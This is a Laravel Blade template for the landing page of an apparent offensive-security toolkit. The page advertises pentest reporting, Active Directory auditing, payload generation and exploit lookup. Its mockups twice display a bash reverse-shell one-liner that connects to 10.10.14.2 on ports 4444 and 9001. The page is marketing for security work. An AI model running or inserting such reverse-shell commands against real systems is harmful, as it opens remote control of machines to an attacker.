<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Offensive Security Labs</title>

    <!-- Favicon -->
    <link rel="icon" type="image/png" href="{{ asset('images/favicon_light.png') }}" media="(prefers-color-scheme: light)">
    <link rel="icon" type="image/png" href="{{ asset('images/favicon_dark.png') }}" media="(prefers-color-scheme: dark)">

    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@400;600;700;800&display=swap" rel="stylesheet">

    <!-- Styles & Scripts -->
    @vite(['resources/css/app.css', 'resources/js/app.js'])
    
    <style>
        :root {
            --font-brand: 'Outfit', sans-serif;
        }
        /* Custom tweaks for Offensive Security theme */
        .landing-page {
            --accent: #8b5cf6; /* Purple */
            --accent-2: #3b82f6; /* Blue */
            --accent-gradient: linear-gradient(135deg, #8b5cf6, #3b82f6);
            --border-glow: rgba(59, 130, 246, 0.4);
        }
        .landing-hero-carousel-mockup-wrap {
            max-width: 900px;
            margin: 0 auto;
        }
    </style>
</head>
<body class="antialiased text-[#e0e0e0] bg-[#0a0a0f]">
    <div class="landing-page overflow-x-hidden scroll-smooth min-h-screen" x-data="{ mobileOpen: false, showWaitlist: false, email: '', success: false, error: '', loading: false }">
        <!-- Canvas Particles Background -->
        <div class="landing-particles-layer" aria-hidden="true">
            <canvas id="particles-canvas" class="absolute inset-0 w-full h-full"></canvas>
        </div>

        <!-- Glassmorphic Header / Navbar -->
        <header class="landing-nav" x-data="{ scrolled: false }" 
                x-init="window.addEventListener('scroll', () => { scrolled = window.scrollY > 12 }, { passive: true })"
                :class="{ 'is-scrolled': scrolled }">
            <div class="landing-nav-inner landing-shell">
                <a href="/" class="group relative z-10 shrink-0 flex items-center select-none text-decoration-none">
                    <img src="{{ asset('images/offsec_dark.png') }}" class="h-11 w-auto max-w-[180px] object-contain transition-transform duration-200 group-hover:scale-105" alt="Logo">
                </a>

                <!-- Nav links removed per user request -->
                <div></div>

                <div class="landing-nav-actions relative z-10">
                    @if (Route::has('login'))
                        @auth
                            <a href="{{ url('/dashboard') }}" class="landing-nav-cta text-decoration-none">Dashboard</a>
                        @else
                            <a href="{{ route('login') }}" class="landing-nav-signin text-decoration-none">Sign in</a>
                            <a href="javascript:void(0)" @click="showWaitlist = true" class="landing-nav-cta hidden sm:inline-flex text-decoration-none">Join Waitlist</a>
                            <a href="javascript:void(0)" @click="showWaitlist = true" class="landing-nav-cta landing-nav-cta--sm sm:hidden text-decoration-none">Join Waitlist</a>
                        @endauth
                    @endif
                </div>
            </div>
        </header>

        <!-- Hero Section -->
        <div class="landing-hero-viewport">
            <section class="landing-hero landing-section">
                <div class="landing-hero-inner landing-shell">
                    <!-- Hero tag rewritten per user request to be just two lines -->
                    <h1 class="landing-hero-title">
                        <span class="landing-hero-line">Offensive security toolkit,</span>
                        <span class="landing-hero-line landing-gradient-text">unified.</span>
                    </h1>

                    <p class="landing-hero-sub">
                        OffSec Labs hosts critical security apps—including professional report builders and AD auditing suites—unified under a single login. Design templates, manage vulnerability findings, and generate compliance reports from one calm, powerful console.
                    </p>

                    <div class="landing-hero-actions">
                        @auth
                            <a href="{{ url('/dashboard') }}" class="landing-btn-primary text-decoration-none">
                                Dashboard <svg class="size-4 ml-1" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                            </a>
                        @else
                            <a href="javascript:void(0)" @click="showWaitlist = true" class="landing-btn-primary text-decoration-none font-sans">
                                Join Waitlist <svg class="size-4 ml-1" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                            </a>
                        @endauth
                        <a href="#apps" class="landing-btn-ghost text-decoration-none font-sans">
                            Explore Modular Apps <svg class="size-4 ml-1" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
                        </a>
                    </div>
                </div>

                <!-- Showcase Console Mockup -->
                <div class="landing-hero-carousel" aria-label="Console Showcase">
                    <div class="landing-hero-carousel-track">
                        <div class="landing-hero-carousel-slide is-active">
                            <div class="landing-hero-carousel-grid">
                                <div class="landing-hero-carousel-pane">
                                    <div class="landing-hero-carousel-mockup-wrap">
                                        <div class="landing-app-mockup">
                                            <div class="landing-app-mockup-titlebar">
                                                <div class="landing-app-mockup-dots">
                                                    <span></span>
                                                    <span></span>
                                                    <span></span>
                                                </div>
                                                <div class="landing-app-mockup-titlebar-center">
                                                    <svg class="size-3.5 text-[#8b5cf6]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                                                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                                                        <path stroke-linecap="round" stroke-linejoin="round" d="M9 10.5l2.5 2.5L9 15.5" />
                                                        <line x1="12.5" y1="15.5" x2="15.5" y2="15.5" stroke-linecap="round" />
                                                    </svg>
                                                    <span>OffSec Command Console</span>
                                                </div>
                                                <div class="landing-app-mockup-titlebar-actions">
                                                    <span class="landing-app-mockup-pill">SSO Connected</span>
                                                    <span class="landing-app-mockup-pill landing-app-mockup-pill--accent">Console v1.0</span>
                                                </div>
                                            </div>
                                            <div class="landing-app-mockup-body flex" style="min-height: 260px;">
                                                <aside class="landing-app-mockup-sidebar">
                                                    <div class="landing-app-mockup-nav-item is-active">Apps Hub</div>
                                                    <div class="landing-app-mockup-nav-item">Report Creator</div>
                                                    <div class="landing-app-mockup-nav-item">AD Auditor</div>
                                                </aside>
                                                <div class="landing-app-mockup-main p-5 text-left w-full overflow-y-auto">
                                                    <div class="flex justify-between items-center mb-4 border-b border-white/5 pb-2">
                                                        <span class="text-xs font-semibold uppercase text-zinc-300">Modular Workspace</span>
                                                        <span class="text-[9px] bg-emerald-500/10 text-emerald-400 px-2 py-0.5 rounded-full border border-emerald-500/20">All services running</span>
                                                    </div>
                                                    <div class="grid grid-cols-2 gap-3">
                                                        <div class="p-3 rounded-lg border border-white/5 bg-white/[0.02] hover:bg-white/[0.04] transition-colors">
                                                            <div class="text-[11px] font-bold text-white mb-1">📝 OffSec Reporting</div>
                                                            <p class="text-[10px] text-zinc-400 leading-normal">Professional pentesting reporting system with CVSS calculators.</p>
                                                        </div>
                                                        <div class="p-3 rounded-lg border border-white/5 bg-white/[0.02] hover:bg-white/[0.04] transition-colors">
                                                            <div class="text-[11px] font-bold text-white mb-1">🛡️ AD Auditor</div>
                                                            <p class="text-[10px] text-zinc-400 leading-normal">Audit domain controllers, check group delegations, and trust structures.</p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="landing-scroll-bridge" aria-hidden="true">
                    <a href="#apps" class="landing-scroll-indicator text-decoration-none">
                        <span>Scroll</span>
                        <div class="landing-scroll-indicator-line"></div>
                    </a>
                </div>
            </section>
        </div>

        <!-- Apps Section (Bento Grid) -->
        <section id="apps" class="landing-section landing-section-pad landing-scroll-target !pt-0 px-4">
            <div class="landing-container">
                <div class="text-center mb-12 md:mb-16 landing-reveal">
                    <h2 class="text-3xl sm:text-4xl md:text-5xl font-bold tracking-[-0.03em] text-[var(--text-primary)] mb-4" style="font-weight: 800;">
                        Modular apps, one workspace
                    </h2>
                    <p class="text-base md:text-lg text-[var(--text-secondary)] max-w-2xl mx-auto">
                        Enable what you need, leave out what you don't. All tools hook into your account under a single credentials database.
                    </p>
                </div>

                <div class="landing-bento landing-reveal">
                    <!-- 1. Finding Templates (Tasks slot) -->
                    <article class="landing-glass landing-bento-card landing-bento-slot-tasks">
                        <div class="size-10 rounded-xl flex items-center justify-center mb-4" style="background: rgba(139, 92, 246, 0.12); box-shadow: 0 0 20px rgba(139, 92, 246, 0.2);">
                            <svg class="size-5 text-[#a78bfa]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                                <rect x="3" y="3" width="18" height="18" rx="2" ry="2"/>
                                <line x1="9" y1="3" x2="9" y2="21"/>
                            </svg>
                        </div>
                        <h3 class="text-lg font-semibold text-[var(--text-primary)] mb-2 tracking-tight">Vulnerability Database</h3>
                        <p class="text-sm text-[var(--text-secondary)] leading-relaxed mb-4">
                            Deploy pre-configured finding templates for SQL Injection, XSS, and credential leaks directly into drafts.
                        </p>
                        <!-- Findings visual: mini severity badges -->
                        <div class="landing-bento-visual p-3 flex flex-wrap gap-2 content-center justify-center">
                            <span class="text-[9px] px-2.5 py-1 rounded border border-red-500/20 bg-red-500/10 text-red-400 font-mono font-semibold">CRITICAL</span>
                            <span class="text-[9px] px-2.5 py-1 rounded border border-orange-500/20 bg-orange-500/10 text-orange-400 font-mono font-semibold">HIGH</span>
                            <span class="text-[9px] px-2.5 py-1 rounded border border-amber-500/20 bg-amber-500/10 text-amber-400 font-mono font-semibold">MEDIUM</span>
                        </div>
                    </article>

                    <!-- 2. Offensive Security Reporting (Money slot) -->
                    <article class="landing-glass landing-bento-card landing-bento-slot-money">
                        <div class="size-10 rounded-xl flex items-center justify-center mb-4" style="background: rgba(139, 92, 246, 0.12); box-shadow: 0 0 20px rgba(139, 92, 246, 0.2);">
                            <svg class="size-5 text-[#a78bfa]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
                                <polyline points="14 2 14 8 20 8" />
                            </svg>
                        </div>
                        <h3 class="text-lg font-semibold text-[var(--text-primary)] mb-2 tracking-tight">Security Reporting</h3>
                        <p class="text-sm text-[var(--text-secondary)] leading-relaxed mb-4">
                            Compile professional pentesting reports using templated layouts and nested CVSS score calculators.
                        </p>
                        <!-- Reporting visual: mini bar chart of findings -->
                        <div class="landing-bento-visual p-3 flex items-end gap-1 h-full">
                            @foreach([35, 55, 45, 80, 50, 75, 60, 95] as $h)
                                <div class="flex-1 rounded-t bg-gradient-to-t from-[#8b5cf6]/70 to-[#3b82f6]/30" style="height: {{ $h }}%;"></div>
                            @endforeach
                        </div>
                    </article>

                    <!-- 3. Active Directory Auditor (Habit tracker slot) -->
                    <article class="landing-glass landing-bento-card landing-bento-slot-habit-tracker">
                        <div class="size-10 rounded-xl flex items-center justify-center mb-4" style="background: rgba(139, 92, 246, 0.12); box-shadow: 0 0 20px rgba(139, 92, 246, 0.2);">
                            <svg class="size-5 text-[#a78bfa]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                                <rect x="2" y="2" width="20" height="8" rx="2" ry="2" />
                                <rect x="2" y="14" width="20" height="8" rx="2" ry="2" />
                                <line x1="6" y1="6" x2="6" y2="6" /><line x1="6" y1="18" x2="6" y2="18" />
                            </svg>
                        </div>
                        <h3 class="text-lg font-semibold text-[var(--text-primary)] mb-2 tracking-tight">AD Auditor</h3>
                        <p class="text-sm text-[var(--text-secondary)] leading-relaxed mb-4">
                            Audit Windows domains, user delegations, and check for Kerberoasting susceptibility.
                        </p>
                        <!-- AD visual: grid cells showing domain control checks -->
                        <div class="landing-bento-visual p-3 grid grid-cols-12 gap-0.5 content-center">
                            @for($i = 0; $i < 36; $i++)
                                @php $r = (($i * 7 + 13) % 100) / 100; @endphp
                                <div class="aspect-square rounded-[2px]" style="background: {{ $r > 0.65 ? '#8b5cf6' : ($r > 0.35 ? 'rgba(139,92,246,0.45)' : 'rgba(255,255,255,0.04)') }};"></div>
                            @endfor
                        </div>
                    </article>

                    <!-- 4. Payload Delivery (Calendar slot) -->
                    <article class="landing-glass landing-bento-card landing-bento-slot-calendar">
                        <div class="size-10 rounded-xl flex items-center justify-center mb-4" style="background: rgba(139, 92, 246, 0.12); box-shadow: 0 0 20px rgba(139, 92, 246, 0.2);">
                            <svg class="size-5 text-[#a78bfa]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                            </svg>
                        </div>
                        <h3 class="text-lg font-semibold text-[var(--text-primary)] mb-2 tracking-tight">Payload Console</h3>
                        <p class="text-sm text-[var(--text-secondary)] leading-relaxed mb-4">
                            Generate and deliver payloads with customizable callback architectures.
                        </p>
                        <!-- Payload visual: grid layout -->
                        <div class="landing-bento-visual p-3 grid grid-cols-7 gap-1 content-center">
                            @for($i = 0; $i < 14; $i++)
                                <div class="aspect-square rounded text-[8px] flex items-center justify-center {{ $i === 5 ? 'bg-[#3b82f6]/30 text-[#3b82f6]' : 'bg-white/[0.03]' }}">
                                    {{ $i + 1 }}
                                </div>
                            @endfor
                        </div>
                    </article>

                    <!-- 5. Vulnerability Scanner (Docuwatcher slot) -->
                    <article class="landing-glass landing-bento-card landing-bento-slot-docuwatcher">
                        <div class="size-10 rounded-xl flex items-center justify-center mb-4" style="background: rgba(139, 92, 246, 0.12); box-shadow: 0 0 20px rgba(139, 92, 246, 0.2);">
                            <svg class="size-5 text-[#a78bfa]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                                <rect x="3" y="3" width="18" height="18" rx="2" />
                                <path d="M9 17v-5h6v5" /><path d="M9 12h6" />
                            </svg>
                        </div>
                        <h3 class="text-lg font-semibold text-[var(--text-primary)] mb-2 tracking-tight">Exploit Research</h3>
                        <p class="text-sm text-[var(--text-secondary)] leading-relaxed mb-4">
                            Validate service vulnerabilities and analyze package security vectors.
                        </p>
                        <!-- Scanner visual -->
                        <div class="landing-bento-visual p-3 space-y-2">
                            @foreach(['Liblzma Backdoor', 'Log4j Injection', 'SSH Bruteforce'] as $i => $cert)
                                <div class="flex items-center justify-between px-2 py-1.5 rounded-md bg-white/[0.03] border border-white/[0.05] text-[10px]">
                                    <span class="text-[var(--text-secondary)]">{{ $cert }}</span>
                                    <span class="{{ $i == 0 ? 'text-red-400' : 'text-emerald-400' }}">
                                        {{ $i == 0 ? 'FAIL' : 'OK' }}
                                    </span>
                                </div>
                            @endforeach
                        </div>
                    </article>

                    <!-- 6. Exploit Database (Subwatch slot) -->
                    <article class="landing-glass landing-bento-card landing-bento-slot-subwatch">
                        <div class="size-10 rounded-xl flex items-center justify-center mb-4" style="background: rgba(139, 92, 246, 0.12); box-shadow: 0 0 20px rgba(139, 92, 246, 0.2);">
                            <svg class="size-5 text-[#a78bfa]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                                <circle cx="12" cy="12" r="10" />
                                <line x1="2" y1="12" x2="22" y2="12" />
                            </svg>
                        </div>
                        <h3 class="text-lg font-semibold text-[var(--text-primary)] mb-2 tracking-tight">Exploit Database</h3>
                        <p class="text-sm text-[var(--text-secondary)] leading-relaxed mb-4">
                            Quick access to validated proofs-of-concept for common CVE mappings.
                        </p>
                        <!-- Exploit visual -->
                        <div class="landing-bento-visual p-3 flex flex-wrap gap-2 content-center">
                            @foreach(['CVE-2024-3094', 'CVE-2021-44228', 'CVE-2023-3519'] as $s)
                                <span class="text-[9px] px-2 py-1 rounded-full border border-[var(--border)] text-[var(--text-secondary)] font-mono">
                                    {{ $s }}
                                </span>
                            @endforeach
                        </div>
                    </article>

                    <!-- 7. Blue Team Sentinel (Atlas slot) -->
                    <article class="landing-glass landing-bento-card landing-bento-slot-atlas">
                        <div class="size-10 rounded-xl flex items-center justify-center mb-4" style="background: rgba(139, 92, 246, 0.12); box-shadow: 0 0 20px rgba(139, 92, 246, 0.2);">
                            <svg class="size-5 text-[#a78bfa]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                                <circle cx="12" cy="12" r="3" />
                            </svg>
                        </div>
                        <h3 class="text-lg font-semibold text-[var(--text-primary)] mb-2 tracking-tight">Sentinel Detections</h3>
                        <p class="text-sm text-[var(--text-secondary)] leading-relaxed mb-4">
                            Deploy corresponding SIEM detection rules alongside offensive playbooks.
                        </p>
                        <!-- Detections visual -->
                        <div class="landing-bento-visual p-3 space-y-2">
                            @foreach(['Sysmon Process Creation', 'LDAP Queries Logged', 'RDP Pipe Access'] as $i => $book)
                                <div class="flex items-center gap-2">
                                    <div class="w-5 h-7 rounded-sm bg-gradient-to-br from-[#8b5cf6]/50 to-[#3b82f6]/30 shrink-0"></div>
                                    <div class="flex-1 min-w-0">
                                        <div class="text-[10px] text-[var(--text-secondary)] truncate">{{ $book }}</div>
                                        <div class="h-1 mt-1 rounded-full bg-white/[0.06] overflow-hidden">
                                            <div class="h-full bg-[#8b5cf6]/70" style="width: {{ [80, 45, 90][$i] }}%;"></div>
                                        </div>
                                    </div>
                                </div>
                            @endforeach
                        </div>
                    </article>

                    <!-- 8. Interactive Console (Media slot) -->
                    <article class="landing-glass landing-bento-card landing-bento-slot-media">
                        <div class="size-10 rounded-xl flex items-center justify-center mb-4" style="background: rgba(139, 92, 246, 0.12); box-shadow: 0 0 20px rgba(139, 92, 246, 0.2);">
                            <svg class="size-5 text-[#a78bfa]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                                <polyline points="4 17 10 11 4 5" /><line x1="12" y1="19" x2="20" y2="19" />
                            </svg>
                        </div>
                        <h3 class="text-lg font-semibold text-[var(--text-primary)] mb-2 tracking-tight">Interactive Lab Shells</h3>
                        <p class="text-sm text-[var(--text-secondary)] leading-relaxed mb-4">
                            Connect directly to terminal shells inside our sandboxed simulation domains.
                        </p>
                        <!-- Shell visual -->
                        <div class="landing-bento-visual p-3 flex flex-col justify-center gap-2">
                            <div class="flex items-end gap-0.5 h-10">
                                @foreach([30, 55, 40, 70, 50, 65, 45, 80] as $h)
                                    <div class="flex-1 rounded-t bg-gradient-to-t from-[#3b82f6]/60 to-[#3b82f6]/15" style="height: {{ $h }}%;"></div>
                                @endforeach
                            </div>
                            <div class="flex items-center gap-2 text-[10px] text-[var(--text-secondary)] font-mono">
                                <span class="size-5 rounded-full border border-[var(--border)] flex items-center justify-center cursor-pointer hover:bg-white/5 transition-colors">▶</span>
                                sh -i >& /dev/tcp/10.10.14.2/4444
                            </div>
                        </div>
                    </article>
                </div>
            </div>
        </section>

        <!-- Spotlight Section (Modular Apps Deep Dive) -->
        <section id="product" class="landing-section landing-section-pad landing-scroll-target px-4" x-data="{ activeSpotlight: 0 }">
            <div class="landing-container">
                <div class="text-center mb-12 md:mb-16 landing-reveal">
                    <p class="text-xs font-semibold tracking-[0.2em] uppercase text-[#a78bfa] mb-3">
                        Technical depth
                    </p>
                    <h2 class="text-3xl sm:text-4xl font-bold tracking-[-0.03em]" style="font-weight: 800;">
                        App Console Modules
                    </h2>
                </div>

                <div class="landing-spotlight-wrap">
                    <!-- Left side controls -->
                    <div class="landing-spotlight-sticky space-y-2">
                        <!-- Card 0: Custom Templates -->
                        <div class="landing-spotlight-item cursor-pointer" 
                             :class="{ 'is-active': activeSpotlight === 0 }"
                             @click="activeSpotlight = 0">
                            <div class="flex items-center gap-2 mb-2">
                                <svg class="size-4 text-[#a78bfa]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="9" y1="3" x2="9" y2="21"/></svg>
                                <span class="text-xs font-semibold uppercase tracking-wider text-[var(--text-secondary)]">Custom Templates</span>
                            </div>
                            <h3 class="text-xl md:text-2xl font-bold tracking-tight mb-2">HTML layout & style design.</h3>
                            <p class="text-sm text-[var(--text-secondary)] leading-relaxed max-w-md">
                                Design and customize report layout structures, CSS styles, typography variables, and classification headers to match your brand.
                            </p>
                        </div>

                        <!-- Card 1: OffSec Reporting -->
                        <div class="landing-spotlight-item cursor-pointer" 
                             :class="{ 'is-active': activeSpotlight === 1 }"
                             @click="activeSpotlight = 1">
                            <div class="flex items-center gap-2 mb-2">
                                <svg class="size-4 text-[#a78bfa]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" /><polyline points="14 2 14 8 20 8" /></svg>
                                <span class="text-xs font-semibold uppercase tracking-wider text-[var(--text-secondary)]">OffSec Reporting</span>
                            </div>
                            <h3 class="text-xl md:text-2xl font-bold tracking-tight mb-2">Templated report builder.</h3>
                            <p class="text-sm text-[var(--text-secondary)] leading-relaxed max-w-md">
                                Write markdown security advisories, calculate CVSS vectors dynamically, and export clean, executive-ready PDF findings.
                            </p>
                        </div>

                        <!-- Card 2: AD Auditor -->
                        <div class="landing-spotlight-item cursor-pointer" 
                             :class="{ 'is-active': activeSpotlight === 2 }"
                             @click="activeSpotlight = 2">
                            <div class="flex items-center gap-2 mb-2">
                                <svg class="size-4 text-[#a78bfa]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2" ry="2" /><rect x="2" y="14" width="20" height="8" rx="2" ry="2" /><line x1="6" y1="6" x2="6" y2="6" /><line x1="6" y1="18" x2="6" y2="18" /></svg>
                                <span class="text-xs font-semibold uppercase tracking-wider text-[var(--text-secondary)]">AD Auditor</span>
                            </div>
                            <h3 class="text-xl md:text-2xl font-bold tracking-tight mb-2">Domain path auditing.</h3>
                            <p class="text-sm text-[var(--text-secondary)] leading-relaxed max-w-md">
                                Audit Kerberos settings, extract service accounts (SPNs), track group memberships, and visualize domain trust paths.
                            </p>
                        </div>

                        <!-- Card 3: Payload Builder -->
                        <div class="landing-spotlight-item cursor-pointer" 
                             :class="{ 'is-active': activeSpotlight === 3 }"
                             @click="activeSpotlight = 3">
                            <div class="flex items-center gap-2 mb-2">
                                <svg class="size-4 text-[#a78bfa]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" /></svg>
                                <span class="text-xs font-semibold uppercase tracking-wider text-[var(--text-secondary)]">Payload Console</span>
                            </div>
                            <h3 class="text-xl md:text-2xl font-bold tracking-tight mb-2">Interactive shellcode builders.</h3>
                            <p class="text-sm text-[var(--text-secondary)] leading-relaxed max-w-md">
                                Generate customized binary payloads, MSFvenom setups, web shells, and configure multi-handling listeners.
                            </p>
                        </div>
                    </div>

                    <!-- Right side mockups (sync'd to active state) -->
                    <div class="landing-spotlight-sticky">
                        <div class="landing-spotlight-panel">
                            <!-- Mockup 0: Custom Templates -->
                            <div class="landing-spotlight-panel-inner" :class="{ 'is-active': activeSpotlight === 0 }">
                                <div class="landing-mock-chrome landing-glass">
                                    <div class="landing-mock-toolbar">
                                        <span class="landing-mock-dot"></span>
                                        <span class="landing-mock-dot"></span>
                                        <span class="landing-mock-dot"></span>
                                    </div>
                                    <div class="p-4 font-sans text-xs text-left text-zinc-300">
                                        <div class="border-b border-zinc-800 pb-2 mb-3 flex justify-between items-center">
                                            <span class="font-bold text-white text-sm">🎨 Layout Template Editor</span>
                                            <span class="text-[10px] text-indigo-400 font-mono">default.html</span>
                                        </div>
                                        <div class="space-y-3 font-mono text-[10px]">
                                            <div class="text-zinc-500">&lt;!-- CSS Stylesheet --&gt;</div>
                                            <div class="text-indigo-400">
                                                body { font-family: 'Outfit'; }<br>
                                                .report-header { color: #8b5cf6; }
                                            </div>
                                            <div class="text-zinc-500">&lt;!-- Report Document Header --&gt;</div>
                                            <div class="text-zinc-300">
                                                &lt;div class="header"&gt;<br>
                                                &nbsp;&nbsp;&nbsp;&nbsp;[CLASSIFICATION] - [CLIENT]<br>
                                                &lt;/div&gt;
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!-- Mockup 1: Reporting -->
                            <div class="landing-spotlight-panel-inner" :class="{ 'is-active': activeSpotlight === 1 }">
                                <div class="landing-mock-chrome landing-glass">
                                    <div class="landing-mock-toolbar">
                                        <span class="landing-mock-dot"></span>
                                        <span class="landing-mock-dot"></span>
                                        <span class="landing-mock-dot"></span>
                                    </div>
                                    <div class="p-4 font-sans text-xs text-left text-zinc-300">
                                        <div class="border-b border-zinc-800 pb-2 mb-3 flex justify-between items-center">
                                            <span class="font-bold text-white text-sm">📝 Report Draft #42</span>
                                            <span class="text-emerald-400 font-mono">CVSS 9.8</span>
                                        </div>
                                        <div class="space-y-2">
                                            <div class="font-semibold text-white">Unauthenticated SQL Injection in Portal</div>
                                            <p class="text-zinc-400 text-[10px]">
                                                The 'id' parameter in /api/profile suffers from raw string concatenation, permitting administrative user bypass.
                                            </p>
                                            <div class="bg-zinc-950 p-2 rounded text-[9px] text-zinc-500 font-mono">
                                                Impact: Administrative Account Takeover / RCE
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!-- Mockup 2: AD Auditor -->
                            <div class="landing-spotlight-panel-inner" :class="{ 'is-active': activeSpotlight === 2 }">
                                <div class="landing-mock-chrome landing-glass">
                                    <div class="landing-mock-toolbar">
                                        <span class="landing-mock-dot"></span>
                                        <span class="landing-mock-dot"></span>
                                        <span class="landing-mock-dot"></span>
                                    </div>
                                    <div class="p-4 font-sans text-xs text-left text-zinc-300">
                                        <div class="text-zinc-500 mb-2 font-mono text-[10px]"># Extracting SPNs...</div>
                                        <div class="p-3 bg-zinc-950/80 rounded border border-zinc-900 font-mono text-[10px] text-zinc-400 leading-normal">
                                            sql_service@offsec.local -> MSSQLSvc/db01:1433<br>
                                            http_app@offsec.local -> HTTP/portal.offsec.local<br><br>
                                            <span class="text-red-400">[!] sql_service SPN has weak RC4 encryption.</span>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!-- Mockup 3: Payload Builder -->
                            <div class="landing-spotlight-panel-inner" :class="{ 'is-active': activeSpotlight === 3 }">
                                <div class="landing-mock-chrome landing-glass">
                                    <div class="landing-mock-toolbar">
                                        <span class="landing-mock-dot"></span>
                                        <span class="landing-mock-dot"></span>
                                        <span class="landing-mock-dot"></span>
                                    </div>
                                    <div class="p-4 font-sans text-xs text-left text-zinc-300">
                                        <div class="text-zinc-400 mb-2 font-mono text-[10px]"># Generated reverse shell code:</div>
                                        <div class="p-3 bg-zinc-950/80 rounded border border-zinc-900 font-mono text-[9px] text-zinc-400 leading-normal">
                                            sh -i >& /dev/tcp/10.10.14.2/9001 0>&1
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Final CTA -->
        <section class="landing-section landing-section-pad px-4">
            <div class="landing-container">
                <div class="landing-final-cta relative landing-reveal">
                    <div class="relative z-10 text-center">
                        <h2 class="text-3xl sm:text-4xl md:text-5xl font-bold tracking-[-0.03em] mb-4 max-w-2xl mx-auto" style="font-weight: 800;">
                            Ready to consolidate your security tools?
                        </h2>
                        <p class="text-[var(--text-secondary)] mb-8 max-w-md mx-auto">
                            Join other security operators using our modular console as a single, consolidated launchpad.
                        </p>
                        
                        <a href="javascript:void(0)" @click="showWaitlist = true" class="landing-btn-primary landing-shimmer-btn w-full max-w-md mx-auto text-decoration-none">
                            Join Waitlist <svg class="size-4 ml-1" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                        </a>
                    </div>
                </div>
            </div>
        </section>

        <!-- Footer -->
        <footer class="landing-section relative border-t border-[var(--border)]">
            <div class="landing-container pt-12 sm:pt-16 md:pt-20 pb-8 sm:pb-12">
                <div class="landing-footer-gradient-line"></div>

                <div class="grid grid-cols-2 md:grid-cols-4 gap-8 md:gap-12 mb-10 md:mb-16">
                    <div class="col-span-2 md:col-span-1">
                        <a href="/" class="group relative z-10 shrink-0 flex items-center select-none text-decoration-none mb-5">
                             <img src="{{ asset('images/offsec_dark.png') }}" class="h-11 w-auto max-w-[180px] object-contain" alt="Logo">
                        </a>
                        <p class="text-sm text-[var(--text-secondary)] max-w-xs leading-relaxed mb-6">
                            A unified, comprehensive knowledge base and command console hosting modular offensive security tools.
                        </p>
                    </div>

                    <div>
                        <h6 class="text-xs font-semibold text-[var(--text-primary)] tracking-wide uppercase mb-5">
                            Console Modules
                        </h6>
                        <ul class="space-y-3 list-none p-0">
                            <li><a href="/login" class="text-sm text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors text-decoration-none">Report Creator</a></li>
                            <li><a href="/login" class="text-sm text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors text-decoration-none">Custom Templates</a></li>
                            <li><a href="/login" class="text-sm text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors text-decoration-none">AD Auditor</a></li>
                            <li><a href="/login" class="text-sm text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors text-decoration-none">Payload Console</a></li>
                        </ul>
                    </div>

                    <div>
